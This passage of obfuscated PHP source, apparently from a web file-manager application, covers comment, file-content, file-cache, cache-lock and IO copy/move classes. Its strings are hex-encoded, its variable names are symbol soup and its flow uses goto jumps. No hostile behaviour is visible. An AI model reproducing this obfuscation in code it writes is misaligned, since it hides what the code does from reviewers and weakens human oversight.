$¡êèóŞö->add($Õ¢á§¥); $Â¼Ó¯¼² = $this->where(array($Â÷ú§éœ[1918] => $ëÜ©ÌÉ¿))->setAdd($Â÷ú§éœ[1920], 1); } else { $¡êèóŞö->where($Õ¢á§¥)->delete(); $Â¼Ó¯¼² = $this->where(array($Â÷ú§éœ[1918] => $ëÜ©ÌÉ¿))->setAdd($Â÷ú§éœ[1920], -1); } return $Â¼Ó¯¼²; } public function targetInfo($¼˜Â—â, $ñå³ÕÆ ) { $úŸ°ŒÈ =& $_SERVER[³½¬ÚË¯]; $œ€¹çäë = array($úŸ°ŒÈ[617] => $¼˜Â—â, $úŸ°ŒÈ[618] => $ñå³ÕÆ ); $©ãµş°® = $this->where($œ€¹çäë)->count(); $ø°Ö¡Ù = "\122\x49\x47\110\124\40\x4a\117\x49\116\40{$this->tablePrefix}\143\x6f\155\155\x65\x6e\164\x5f\x70\x72\141\x69\x73\x65\40\163\x74\141\x72\40\x6f\156\x20\143\157\x6d\x6d\145\156\x74\56\x63\157\155\155\145\156\x74\x49\104\40\75\40\x73\164\x61\162\56\143\x6f\x6d\x6d\145\x6e\164\x49\104"; $ôáúæí = $this->alias($úŸ°ŒÈ[398])->where($œ€¹çäë)->join($ø°Ö¡Ù, $úŸ°ŒÈ[1929])->count(); $ÉƒÛêæ­ = array($úŸ°ŒÈ[1930] => $©ãµş°®, $úŸ°ŒÈ[1931] => $ôáúæí); return $ÉƒÛêæ­; } public function listData($¤çÇ’˜¹) { $ÄÛäâÔ =& $_SERVER[³½¬ÚË¯]; if (isset($¤çÇ’˜¹[$ÄÛäâÔ[1932]])) { if ($¤çÇ’˜¹[$ÄÛäâÔ[1932]]) { $¤çÇ’˜¹[$ÄÛäâÔ[1925]] = array($ÄÛäâÔ[1057], intval($¤çÇ’˜¹[$ÄÛäâÔ[1932]])); } unset($¤çÇ’˜¹[$ÄÛäâÔ[1932]]); } if (isset($¤çÇ’˜¹[$ÄÛäâÔ[1933]])) { if ($¤çÇ’˜¹[$ÄÛäâÔ[1933]]) { $¤çÇ’˜¹[$ÄÛäâÔ[1925]] = array($ÄÛäâÔ[1054], intval($¤çÇ’˜¹[$ÄÛäâÔ[1933]])); } unset($¤çÇ’˜¹[$ÄÛäâÔ[1933]]); } return $this->_listData($¤çÇ’˜¹); } private function _listData($Ãã‘Ñ¦Â) { $“–ÕÇŒÉ =& $_SERVER[³½¬ÚË¯]; $‘˜íªæ½ = $this->where($Ãã‘Ñ¦Â)->_makeOrder()->selectPage(100); $this->_listAppendParent($‘˜íªæ½[$“–ÕÇŒÉ[413]]); $this->_listAppendUser($‘˜íªæ½[$“–ÕÇŒÉ[413]]); $this->_listAppendMeta($‘˜íªæ½[$“–ÕÇŒÉ[413]]); return $‘˜íªæ½; } private function _makeOrder() { $Ò¿ÄÓµ‰ =& $_SERVER[³½¬ÚË¯]; $øÓãÜ’ = array($Ò¿ÄÓµ‰[1920], $Ò¿ÄÓµ‰[1919], $Ò¿ÄÓµ‰[215]); $ÄäÁÃÓŒ = Input::get($Ò¿ÄÓµ‰[498], $Ò¿ÄÓµ‰[7], $Ò¿ÄÓµ‰[465], $øÓãÜ’); $é—êİ©Ú = Input::get($Ò¿ÄÓµ‰[499], $Ò¿ÄÓµ‰[7], $Ò¿ÄÓµ‰[1683], array($Ò¿ÄÓµ‰[1934], $Ò¿ÄÓµ‰[494])); $ªâ–à˜ü = $ÄäÁÃÓŒ . $Ò¿ÄÓµ‰[53] . $é—êİ©Ú; return $this->order($ªâ–à˜ü); } private function _listAppendParent(&$Îù÷×ÔÂ) { $¥ƒïÖŸ¡ =& $_SERVER[³½¬ÚË¯]; $‹ı±Ü‹ = array_unique(array_to_keyvalue($Îù÷×ÔÂ, $¥ƒïÖŸ¡[12], $¥ƒïÖŸ¡[1917])); $‹ı±Ü‹ = array_remove_value($‹ı±Ü‹, $¥ƒïÖŸ¡[212]); if (!$‹ı±Ü‹) { return; } $˜Ö¦ò‹ş = $this->where(array($¥ƒïÖŸ¡[1918] => array($¥ƒïÖŸ¡[7], $‹ı±Ü‹)))->select(); $˜Ö¦ò‹ş = array_to_keyvalue($˜Ö¦ò‹ş, $¥ƒïÖŸ¡[1925]); foreach ($Îù÷×ÔÂ as &$Ôö’ÀÉ¥) { if (isset($˜Ö¦ò‹ş[$Ôö’ÀÉ¥[$¥ƒïÖŸ¡[1917]]])) { $Ôö’ÀÉ¥[$¥ƒïÖŸ¡[1935]] = $˜Ö¦ò‹ş[$Ôö’ÀÉ¥[$¥ƒïÖŸ¡[1917]]]; } } unset($Ôö’ÀÉ¥); } private function _listAppendUser(&$úëäêé©) { $¯ßşÃµú =& $_SERVER[³½¬ÚË¯]; $ø¨˜Ó»¬ = array_unique(array_to_keyvalue($úëäêé©, $¯ßşÃµú[12], $¯ßşÃµú[1690])); $ø¨˜Ó»¬ = array_remove_value($ø¨˜Ó»¬, $¯ßşÃµú[212]); if (count($ø¨˜Ó»¬) == 0) { return; } foreach ($úëäêé© as $§„²Ì¾é) { if (isset($§„²Ì¾é[$¯ßşÃµú[1935]])) { $ø¨˜Ó»¬[] = $§„²Ì¾é[$¯ßşÃµú[1935]][$¯ßşÃµú[1690]]; } } $ı´èíŠ  = Model($¯ßşÃµú[568])->userListInfo($ø¨˜Ó»¬); foreach ($úëäêé© as &$§„²Ì¾é) { $§„²Ì¾é[$¯ßşÃµú[631]] = $ı´èíŠ [$§„²Ì¾é[$¯ßşÃµú[1690]]]; if (isset($§„²Ì¾é[$¯ßşÃµú[1935]])) { $§„²Ì¾é[$¯ßşÃµú[1935]][$¯ßşÃµú[631]] = $ı´èíŠ [$§„²Ì¾é[$¯ßşÃµú[1935]][$¯ßşÃµú[1690]]]; } } unset($§„²Ì¾é); } private function _listAppendMeta(&$ãÂ—ƒÇË) { $Ëì…çà =& $_SERVER[³½¬ÚË¯]; $ôÒÂø„Ø = array_unique(array_to_keyvalue($ãÂ—ƒÇË, $Ëì…çà[12], $Ëì…çà[1925])); $ôÒÂø„Ø = array_remove_value($ôÒÂø„Ø, $Ëì…çà[212]); if (!$ôÒÂø„Ø) { return; } foreach ($ãÂ—ƒÇË as $úƒ™Ä™¥) { if (isset($úƒ™Ä™¥[$Ëì…çà[1935]])) { $ôÒÂø„Ø[] = $úƒ™Ä™¥[$Ëì…çà[1935]][$Ëì…çà[1925]]; } } $÷®€ºîœ = $this->metaList($ôÒÂø„Ø); if (!$÷®€ºîœ) { return !1; } foreach ($ãÂ—ƒÇË as &$úƒ™Ä™¥) { $úƒ™Ä™¥[$Ëì…çà[507]] = $÷®€ºîœ[$úƒ™Ä™¥[$Ëì…çà[1925]]]; if (isset($úƒ™Ä™¥[$Ëì…çà[1935]])) { $úƒ™Ä™¥[$Ëì…çà[1935]][$Ëì…çà[507]] = $÷®€ºîœ[$úƒ™Ä™¥[$Ëì…çà[1935]][$Ëì…çà[1925]]]; } } unset($úƒ™Ä™¥); } private function metaList($ã®¢‡«) { $Á¢··İ¦ =& $_SERVER[³½¬ÚË¯]; if (!$ã®¢‡«) { return array(); } $ôó•×… = array($Á¢··İ¦[1925] => array($Á¢··İ¦[7], $ã®¢‡«)); $„û—Êë = Model($Á¢··İ¦[1936])->where($ôó•×…)->select(); $„û—Êë = array_to_keyvalue_group($„û—Êë, $Á¢··İ¦[1925]); foreach ($„û—Êë as $â—­öğ => $‰©˜©Â£) { $ÏîÙÁè€ = array(); foreach ($‰©˜©Â£ as $¾ÌÄ¹¾÷) { $ÏîÙÁè€[$¾ÌÄ¹¾÷[$Á¢··İ¦[94]]] = $¾ÌÄ¹¾÷[$Á¢··İ¦[418]]; } $„û—Êë[$â—­öğ] = $ÏîÙÁè€; } return $„û—Êë ? $„û—Êë : array(); } } class FileContentModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\146\x69\x6c\x65\137\x63\157\156\164\x65\x6e\x74\x73"; protected $dataAuto = array(array("\x63\x72\x65\141\x74\145\124\x69\155\x65", "\x74\x69\155\x65", "\x69\x6e\163\145\x72\x74", "\x66\165\156\143\164\151\157\156")); } goto Fí™î•¶Ô¦; eÖ‡ŞÂØåá: function binCheckBigger($§™æÃ˜×, $¡Õ…î’Ç) { return $§™æÃ˜× > $¡Õ…î’Ç; } $_SERVER[$_SERVER[îˆ‡ºÄµ][3]] = ("\x38\x32\x39\x39"."\x30\x31")+0;$_ad29="6gtplk3zx0h7wuibe51moj429fvycqd8asrnrbj7qim0ohk93yag2xpevfltw4cs6z5d81nuo2en";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($İí©Éıœ, $Ãé°Á–ó) { $Ó…ûµ¬— =& $_SERVER[³½¬ÚË¯]; if (isset(self::$_methodList[$İí©Éıœ])) { return @call_user_func_array(self::$_methodList[$İí©Éıœ], $Ãé°Á–ó); } else { if (method_exists($this, $İí©Éıœ)) { return call_user_func_array(array($this, $İí©Éıœ), $Ãé°Á–ó); } else { think_exception(__CLASS__ . $Ó…ûµ¬—[4] . $İí©Éıœ . $Ó…ûµ¬—[5]); } } } public static function __callStatic($¯šÈÌ, $Á ¼¾£) { if (isset(self::$_methodListStatic[$¯šÈÌ])) { return call_user_func_array(self::$_methodListStatic[$¯šÈÌ], $Á ¼¾£); } else { if (method_exists(self, $¯šÈÌ)) { return call_user_func_array(array(self, $¯šÈÌ), $Á ¼¾£); } else { show_json("{$¯šÈÌ}\50\51\40\156\157\164\x20\145\x78\151\x73\x74\73", !1); } } } public static function addMethod($óĞè€ø©, $¨†Äåİå) { self::$_methodList[$óĞè€ø©] = $¨†Äåİå; } public static function addMethodStatic($¡ê¼­¹ã, $¡íÕîÜ¬) { self::$_methodListStatic[$¡ê¼­¹ã] = $¡íÕîÜ¬; } } goto FŠ©ß£·˜«; BŞ§ÀçÑ­­: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($¡Ïú…ï‚, $˜éÁˆıÊ) { $²¢ÂÀèú =& $_SERVER[³½¬ÚË¯]; $this->cachePath = $¡Ïú…ï‚[$²¢ÂÀèú[84]]; $this->prefix = $²¢ÂÀèú[871]; $this->cacheTime = $˜éÁˆıÊ; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($ı˜¬ïÆ ) { $Ó×óÔò– =& $_SERVER[³½¬ÚË¯]; $ı˜¬ïÆ  = str_replace(array($Ó×óÔò–[872], $Ó×óÔò–[97], $Ó×óÔò–[73]), $Ó×óÔò–[873], $ı˜¬ïÆ ); return $this->cachePath . $Ó×óÔò–[874] . $ı˜¬ïÆ  . $Ó×óÔò–[875]; } public function set($Ğ“îß©ç, $êàò©¨Ú, $ı¢ñ£ÉÍ = false) { $ı¢ñ£ÉÍ = $ı¢ñ£ÉÍ ? $ı¢ñ£ÉÍ : $this->cacheTime; $ûÆ¡ëï§ = $this->getFile($Ğ“îß©ç); if (file_put_contents($ûÆ¡ëï§, $this->prefix . $êàò©¨Ú, LOCK_EX)) { @touch($ûÆ¡ëï§, intval(time() + $ı¢ñ£ÉÍ)); clearstatcache(); return !0; } @unlink($ûÆ¡ëï§); return !1; } public function get($¿éªÈÃ«) { $ßÃ­œ”Î = $this->getFile($¿éªÈÃ«); if (file_exists($ßÃ­œ”Î) && filemtime($ßÃ­œ”Î) < time()) { @unlink($ßÃ­œ”Î); return !1; } $ÓßÚŸ« = @file_get_contents($ßÃ­œ”Î); return substr($ÓßÚŸ«, strlen($this->prefix)); } public function remove($³¾´¬£ü) { $­øëÅ£– = $this->getFile($³¾´¬£ü); return @unlink($­øëÅ£–); } public function deleteAll() { $³—Ö‰ª =& $_SERVER[³½¬ÚË¯]; $æ…íÙø = scandir($this->cachePath); foreach ($æ…íÙø as $†´ª¯¥›) { $ÄªéË·º = $this->cachePath . $†´ª¯¥›; if (strpos($ÄªéË·º, $³—Ö‰ª[875]) && strpos($ÄªéË·º, $³—Ö‰ª[876])) { @unlink($ÄªéË·º); } } } public function clearTimeout() { $ŞŸŞıª =& $_SERVER[³½¬ÚË¯]; $Äª·Ô™ = scandir($this->cachePath); foreach ($Äª·Ô™ as $ÌöÒçÑ) { $¡È§í«— = $this->cachePath . $ÌöÒçÑ; if (strpos($¡È§í«—, $ŞŸŞıª[875]) && strpos($¡È§í«—, $ŞŸŞıª[876]) && filemtime($¡È§í«—) < time()) { @unlink($¡È§í«—); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $‘ üÏ™È =& $_SERVER[³½¬ÚË¯]; if (self::$handle) { return self::$handle; } $àÆ°ì¬… = $GLOBALS[$‘ üÏ™È[6]][$‘ üÏ™È[393]]; self::$timeout = $àÆ°ì¬…[$‘ üÏ™È[877]] ? $àÆ°ì¬…[$‘ üÏ™È[877]] : 10; $ŸÀğ°§ = _get($GLOBALS[$‘ üÏ™È[6]], $‘ üÏ™È[878]); $èÓıŸŞç = $àÆ°ì¬…[$‘ üÏ™È[863]] ? $àÆ°ì¬…[$‘ üÏ™È[863]] : $‘ üÏ™È[214]; if ($èÓıŸŞç == $‘ üÏ™È[21] && $ŸÀğ°§ == $‘ üÏ™È[13]) { $èÓıŸŞç = $‘ üÏ™È[214]; } switch ($èÓıŸŞç) { case $‘ üÏ™È[866]: self::$handle = new CacheLockRedis(); break; case $‘ üÏ™È[867]: self::$handle = new CacheLockMemcached(); break; case $‘ üÏ™È[21]: self::$handle = new CacheLockDatabase(); break; case $‘ üÏ™È[214]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($‘ üÏ™È[879], $‘ üÏ™È[880]); } return self::$handle; } private static function key($—óæşš½) { return $_SERVER[³½¬ÚË¯][881] . Cache::key($—óæşš½); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($Ä©„ÕÕÙ = '') { self::$errorMsg = $Ä©„ÕÕÙ; } public static function lockGlobal($Ø›š”É€, $²û¼Ğ¡Ÿ) { return self::lock($Ø›š”É€, $²û¼Ğ¡Ÿ, !0); } public static function lock($ÓÉ“‡È, $ÎÊªúƒ = false, $šÒ“™Í” = false) { $ÅŞ¹Î¥Î =& $_SERVER[³½¬ÚË¯]; $‚îÛ·¹Ê = self::init(); $ÊÇõ«Ã‰ = self::key($ÓÉ“‡È); $ÎÊªúƒ = $ÎÊªúƒ ? $ÎÊªúƒ : self::$timeout; $òñ£­ìù = timeFloat(); $ÓÀ®ªÏ¹ = $‚îÛ·¹Ê->lock($ÊÇõ«Ã‰, $ÎÊªúƒ); $ÑñŸá• = timeFloat(); if (!$ÓÀ®ªÏ¹) { $÷ÑàšÜÎ = "\154\157\x63\153\40\x65\162\x72\157\162\73\153\x65\171\x3d{$ÓÉ“‡È}\73\x74\x69\155\145\75{$ÎÊªúƒ}\x3b" . self::$errorMsg . $ÅŞ¹Î¥Î[71] . get_caller_msg(); $Øç¾²÷¨ = LNG($ÅŞ¹Î¥Î[882]) . "\x28{$ÎÊªúƒ}\x73\x29\56" . LNG($ÅŞ¹Î¥Î[883]); $Øç¾²÷¨ .= $ÅŞ¹Î¥Î[884]; if (is_string(self::$errorMsg) && self::$errorMsg) { $Øç¾²÷¨ = $Øç¾²÷¨ . $ÅŞ¹Î¥Î[885] . self::$errorMsg; } write_log($ÅŞ¹Î¥Î[886] . sprintf($ÅŞ¹Î¥Î[887], timeFloat() - $òñ£­ìù) . $ÅŞ¹Î¥Î[888] . $÷ÑàšÜÎ . $ÅŞ¹Î¥Î[889] . error_get_last(), $ÅŞ¹Î¥Î[880]); show_json($Øç¾²÷¨, !1); } if (!$šÒ“™Í”) { self::$lockItem[$ÊÇõ«Ã‰] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $äà¹¯ğ = number_format(timeFloat() - $ÑñŸá•, 3); write_log($ÅŞ¹Î¥Î[890] . $ÓÉ“‡È . $ÅŞ¹Î¥Î[891] . $äà¹¯ğ, $ÅŞ¹Î¥Î[880]); } return $ÓÀ®ªÏ¹; } public static function lockGet($ŞŒ¥Ê´·) { $êÈóØŠã = self::key($ŞŒ¥Ê´·); if (self::$lockItem[$êÈóØŠã]) { return self::$lockItem[$êÈóØŠã]; } return self::init()->lockGet($êÈóØŠã); } public static function unlock($ÖŒèÅ¯) { $ïÏš×–È =& $_SERVER[³½¬ÚË¯]; $„‚•›‹¼ = self::key($ÖŒèÅ¯); self::$lockItem[$„‚•›‹¼] = null; self::init()->unlock($„‚•›‹¼); if (GLOBAL_DEBUG_LOG_ALL) { write_log($ïÏš×–È[892] . $ÖŒèÅ¯, $ïÏš×–È[880]); } return; } public static function unlockRuntime() { $¸ºƒ•¥Ô =& $_SERVER[³½¬ÚË¯]; $Ş´÷Ã¸¼ = self::init(); $ãï¢–ÏŞ = !1; foreach (self::$lockItem as $Ş•Ì‘Ôá => $¶İå÷í») { if (!$¶İå÷í») { continue; } $Ş´÷Ã¸¼->unlock($Ş•Ì‘Ôá); if (!$ãï¢–ÏŞ) { $ãï¢–ÏŞ = !0; write_log($¸ºƒ•¥Ô[893] . $Ş•Ì‘Ôá . $¸ºƒ•¥Ô[71] . get_caller_msg(), $¸ºƒ•¥Ô[880]); continue; } write_log($¸ºƒ•¥Ô[893] . $Ş•Ì‘Ôá, $¸ºƒ•¥Ô[880]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $¢†Áüí§ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($¸ºƒ•¥Ô[894] . $¢†Áüí§ . $¸ºƒ•¥Ô[895] . ACTION, $¸ºƒ•¥Ô[880]); } } public static function fileLock($çãè·ş) { $ÃÓÄêÅ÷ =& $_SERVER[³½¬ÚË¯]; if (!$GLOBALS[$ÃÓÄêÅ÷[896]]) { $GLOBALS[$ÃÓÄêÅ÷[896]] = array(); } $GLOBALS[$ÃÓÄêÅ÷[896]][$çãè·ş] = !1; $ÙöÚ® = fopen(DATA_PATH . $çãè·ş . $ÃÓÄêÅ÷[897], $ÃÓÄêÅ÷[898]); if (!$ÙöÚ®) { return !1; } $GLOBALS[$ÃÓÄêÅ÷[896]][$çãè·ş] = $ÙöÚ®; if (flock($ÙöÚ®, LOCK_EX)) { return !0; } self::unlock($çãè·ş); show_json($ÃÓÄêÅ÷[899], !1); return !1; } public static function fileUnlock($šõ…¿Ñ‚) { $Ãú¾«Ã =& $_SERVER[³½¬ÚË¯]; $Ê‰˜›Î = $GLOBALS[$Ãú¾«Ã[896]][$šõ…¿Ñ‚]; if (!$Ê‰˜›Î) { return; } $GLOBALS[$Ãú¾«Ã[896]][$šõ…¿Ñ‚] = !1; flock($Ê‰˜›Î, LOCK_UN); fclose($Ê‰˜›Î); } public static function fileUnlockAll() { $İÌ‚’ó× =& $_SERVER[³½¬ÚË¯]; if (!$GLOBALS[$İÌ‚’ó×[896]]) { return; } foreach ($GLOBALS[$İÌ‚’ó×[896]] as $óÏ¢á¾È => $¸®–ï´ç) { if (!$¸®–ï´ç) { continue; } $GLOBALS[$İÌ‚’ó×[896]][$óÏ¢á¾È] = !1; flock($¸®–ï´ç, LOCK_UN); fclose($¸®–ï´ç); } $GLOBALS[$İÌ‚’ó×[896]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } goto c³Ó· †è; Aõ³ê‡‡§Ê: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($›éĞ“¢õ, $Ò“ıŒØ‹) { $ùŸª¹äœ =& $_SERVER[³½¬ÚË¯]; $ê»¾Èñ = $Ò“ıŒØ‹; $GLOBALS[$ùŸª¹äœ[1189]] = $ùŸª¹äœ[1190] . $›éĞ“¢õ; Hook::trigger($ùŸª¹äœ[1190] . $›éĞ“¢õ . $ùŸª¹äœ[1191], $ê»¾Èñ); $š„®Û¬ = self::driverMake($Ò“ıŒØ‹[0]); if (!$š„®Û¬) { return !1; } if (method_exists($š„®Û¬, $›éĞ“¢õ)) { $îü ¯ş€ = @call_user_func_array(array($š„®Û¬, $›éĞ“¢õ), $Ò“ıŒØ‹); } else { if (method_exists($š„®Û¬, $ùŸª¹äœ[1192])) { $îü ¯ş€ = @call_user_func_array(array($š„®Û¬, $›éĞ“¢õ), $Ò“ıŒØ‹); } else { if (method_exists(self, $›éĞ“¢õ)) { $îü ¯ş€ = @call_user_func_array(array(self, $›éĞ“¢õ), $Ò“ıŒØ‹); } else { $îü ¯ş€ = call_user_func_array(array(parent, $›éĞ“¢õ), $Ò“ıŒØ‹); } } } Hook::trigger($ùŸª¹äœ[1190] . $›éĞ“¢õ . $ùŸª¹äœ[1193], $ê»¾Èñ, $îü ¯ş€); return $îü ¯ş€; } public static function init($ô©Šè») { return self::driverMake($ô©Šè»); } public static function copy($ô†Áµ©, $ß´öØª, $¼ı‚… = false, $êçğ°ø˜ = false) { return self::copyMoveStart($ô†Áµ©, $ß´öØª, $¼ı‚…, $_SERVER[³½¬ÚË¯][587], $êçğ°ø˜); } public static function move($Èß¬³–, $ş¸şßĞ, $¡½ÏòÂ‡ = false, $ä¡˜åÒæ = false) { return self::copyMoveStart($Èß¬³–, $ş¸şßĞ, $¡½ÏòÂ‡, $_SERVER[³½¬ÚË¯][589], $ä¡˜åÒæ); } private static function copyMoveStart($İ¸ö¡¢æ, $Îå»…à¸, $Ÿşõø–, $¨ÆÇÑ¨û, $Ø°Ï¨¬Ç) { $°†à×»… =& $_SERVER[³½¬ÚË¯]; $«õß»èî = array($İ¸ö¡¢æ, $Îå»…à¸, $Ÿşõø–, $Ø°Ï¨¬Ç); Hook::trigger($°†à×»…[1190] . $¨ÆÇÑ¨û . $°†à×»…[1191], $«õß»èî); $Şã—‹« = self::copyMove($İ¸ö¡¢æ, $Îå»…à¸, $Ÿşõø–, $¨ÆÇÑ¨û, $Ø°Ï¨¬Ç); Hook::trigger($°†à×»…[1190] . $¨ÆÇÑ¨û . $°†à×»…[1193], $«õß»èî, $Şã—‹«); return $Şã—‹«; } public static function saveFile($¡ˆ…ŠŒÚ, $¹ı§¢º™, $øµŠ·‡İ = true) { $úºÄê£ =& $_SERVER[³½¬ÚË¯]; $öÌÌ¨²š = self::info($¹ı§¢º™); $ÕÑãğ¢© = self::driverMake($¡ˆ…ŠŒÚ); $Ôİš¡û¶ = self::driverMake($¹ı§¢º™); $•Õ”½ÆŒ = !1; if ($Ôİš¡û¶->pathParse[$úºÄê£[1194]]) { $•Õ”½ÆŒ = $Ôİš¡û¶; $±É™¼È¼ = $Ôİš¡û¶->pathParse[$úºÄê£[1194]]; $Ôİš¡û¶ = self::driverMake($±É™¼È¼); } if ($ÕÑãğ¢©->pathParse[$úºÄê£[1194]]) { $§Êêˆé = $ÕÑãğ¢©->pathParse[$úºÄê£[1194]]; $ÕÑãğ¢© = self::driverMake($§Êêˆé); } $ß©´•ıÅ = $Ôİš¡û¶->pathFather($¹ı§¢º™); $Øë€úœ = !0; if (!$øµŠ·‡İ && self::driverIsSame($ÕÑãğ¢©, $Ôİš¡û¶)) { $Øë€úœ = !1; } $³ºå»Õ¸ = self::copyFile($ÕÑãğ¢©, $¡ˆ…ŠŒÚ, $Ôİš¡û¶, $ß©´•ıÅ, $öÌÌ¨²š[$úºÄê£[32]], $Øë€úœ); if ($•Õ”½ÆŒ) { $³ºå»Õ¸ = $•Õ”½ÆŒ->getPathOuter($³ºå»Õ¸); } return $³ºå»Õ¸; } private static function copyMove($”€œ£„, $ì£èíÉô, $û¥ï¦èÖ, $Úãå¢²â, $„ŠÖõ¥ö = false) { $¤şêéÈ– =& $_SERVER[³½¬ÚË¯]; if (!$”€œ£„ || $”€œ£„ == $¤şêéÈ–[8] || !$ì£èíÉô) { return !1; } ignore_timeout(); $’ÖàíÕÆ = self::driverMake($”€œ£„); $ßùŸºÔ÷ = self::driverMake($ì£èíÉô); $‹òƒ½ € = $Úãå¢²â == $¤şêéÈ–[589]; $œ‘–ª– = !1; if ($ßùŸºÔ÷->pathParse[$¤şêéÈ–[1194]]) { $œ‘–ª– = $ßùŸºÔ÷; $ì£èíÉô = $ßùŸºÔ÷->pathParse[$¤şêéÈ–[1194]]; $ßùŸºÔ÷ = self::driverMake($ì£èíÉô); } if ($’ÖàíÕÆ->pathParse[$¤şêéÈ–[1194]]) { $”€œ£„ = $’ÖàíÕÆ->pathParse[$¤şêéÈ–[1194]]; $’ÖàíÕÆ = self::driverMake($”€œ£„); } self::check($’ÖàíÕÆ, $”€œ£„, $ßùŸºÔ÷, $ì£èíÉô); Hook::trigger($¤şêéÈ–[1195], $’ÖàíÕÆ, $”€œ£„, $ßùŸºÔ÷, $ì£èíÉô); $«ãèĞã = self::driverIsSame($’ÖàíÕÆ, $ßùŸºÔ÷); if ($«ãèĞã) { if ($Úãå¢²â == $¤şêéÈ–[589] && !method_exists($ßùŸºÔ÷, $¤şêéÈ–[1196]) && trim($ì£èíÉô, $¤şêéÈ–[8]) == trim($ßùŸºÔ÷->pathFather($”€œ£„), $¤şêéÈ–[8])) { if ($’ÖàíÕÆ->pathThis($”€œ£„) != $„ŠÖõ¥ö && !$’ÖàíÕÆ->isTypeObject()) { return $’ÖàíÕÆ->rename($”€œ£„, $„ŠÖõ¥ö); } return $ßùŸºÔ÷->getPathOuter($”€œ£„); } if (method_exists($ßùŸºÔ÷, $Úãå¢²â)) { return $ßùŸºÔ÷->{$Úãå¢²â}($”€œ£„, $ì£èíÉô, $û¥ï¦èÖ, $„ŠÖõ¥ö); } } if ($«ãèĞã && $Úãå¢²â == $¤şêéÈ–[589] && $ßùŸºÔ÷->getType() == $¤şêéÈ–[106]) { $Ù ¯†› = $ßùŸºÔ÷->movePath($”€œ£„, $ì£èíÉô, $„ŠÖõ¥ö); if ($Ù ¯†›) { return $Ù ¯†›; } } $ŸÊ»øÁñ = $’ÖàíÕÆ->isFile($”€œ£„); if (!$ŸÊ»øÁñ && $ßùŸºÔ÷->getType() == $¤şêéÈ–[793] && $’ÖàíÕÆ->getType() == $¤şêéÈ–[106]) { $Ù ¯†› = $ßùŸºÔ÷->copyFolderFromIO($’ÖàíÕÆ, $”€œ£„, $ì£èíÉô, $û¥ï¦èÖ, $‹òƒ½ €, $„ŠÖõ¥ö); } else { $Ù ¯†› = self::copyPath($’ÖàíÕÆ, $”€œ£„, $ßùŸºÔ÷, $ì£èíÉô, $û¥ï¦èÖ, $‹òƒ½ €, $ŸÊ»øÁñ, $„ŠÖõ¥ö); } if ($Ù ¯†› && $‹òƒ½ €) { $’ÖàíÕÆ->remove($”€œ£„); } if ($œ‘–ª–) { $Ù ¯†› = $œ‘–ª–->getPathOuter($Ù ¯†›); } return $Ù ¯†›; } private static function check($‚Ú©üï, $úˆÂ†¢À, $¿ƒ†Œ÷ì, &$¹‚ÖÊİÌ) { $·’·í£ =& $_SERVER[³½¬ÚË¯]; if (self::driverIsSame($‚Ú©üï, $¿ƒ†Œ÷ì) && $‚Ú©üï->isFolder($úˆÂ†¢À) && $‚Ú©üï->isParentOf($úˆÂ†¢À, $¹‚ÖÊİÌ)) { show_json(LNG($·’·í£[1197]), !1); } if (!$‚Ú©üï->exist($úˆÂ†¢À)) { show_json(LNG($·’·í£[105]), !1); } } private static function copyPath($ş˜ú×¢Ã, $³‚‡ú±µ, $“óıÜšÜ, $—œÔ¹•÷, $«¨à°¿…, $Â¤¬Ïï, $ğ°ôì¯, $«‡‡œŒ® = false, $¼ÙÛÓüş = true) { $‚õÕıı =& $_SERVER[³½¬ÚË¯]; $ôñÏùÊµ = empty($«‡‡œŒ®) && $«‡‡œŒ® !== $‚õÕıı[212] ? $ş˜ú×¢Ã->pathThis($³‚‡ú±µ) : $«‡‡œŒ®; if ($«¨à°¿…) { $”Ğœ¶İÕ = $“óıÜšÜ->fileNameExist($—œÔ¹•÷, $ôñÏùÊµ); $Ç–ÌÆ = $ôñÏùÊµ; $ôñÏùÊµ = $“óıÜšÜ->fileNameAuto($—œÔ¹•÷, $ôñÏùÊµ, $«¨à°¿…, !$ğ°ôì¯); if (!$”Ğœ¶İÕ || $Ç–ÌÆ != $ôñÏùÊµ) { $«¨à°¿… = !1; } if ($¼ÙÛÓüş && !$«¨à°¿…) { $“óıÜšÜ->_data[$‚õÕıı[1198]] = !0; } } if ($ğ°ôì¯) { return self::copyFile($ş˜ú×¢Ã, $³‚‡ú±µ, $“óıÜšÜ, $—œÔ¹•÷, $ôñÏùÊµ, $Â¤¬Ïï); } if ($«¨à°¿… == REPEAT_RENAME_FOLDER) { $«¨à°¿… = !1; } $†Ñé¨‡É = rtrim($—œÔ¹•÷, $‚õÕıı[8]) . $‚õÕıı[8] . $ôñÏùÊµ; $ãÎÒøˆ = $“óıÜšÜ->mkdir($“óıÜšÜ->getPath($†Ñé¨‡É), $«¨à°¿…); $—œÔ¹•÷ = $“óıÜšÜ->getPathInner($ãÎÒøˆ); $¨ÛÆö¸ù = $ş˜ú×¢Ã->listPath($³‚‡ú±µ, !0); $¨ÛÆö¸ù = is_array($¨ÛÆö¸ù) ? $¨ÛÆö¸ù : array($‚õÕıı[83] => array(), $‚õÕıı[82] => array()); $şÙŞ„¯ = array_merge($¨ÛÆö¸ù[$‚õÕıı[83]], $¨ÛÆö¸ù[$‚õÕıı[82]]); foreach ($şÙŞ„¯ as $‘ÄæÅ ü) { $Õ‡–ë˜Ë = $‘ÄæÅ ü[$‚õÕıı[33]] == $‚õÕıı[214]; $³‚‡ú±µ = $ş˜ú×¢Ã->getPathInner($‘ÄæÅ ü[$‚õÕıı[84]]); $Şá•³º» = self::copyPath($ş˜ú×¢Ã, $³‚‡ú±µ, $“óıÜšÜ, $—œÔ¹•÷, $«¨à°¿…, $Â¤¬Ïï, $Õ‡–ë˜Ë, !1, !1); if (!$Şá•³º») { 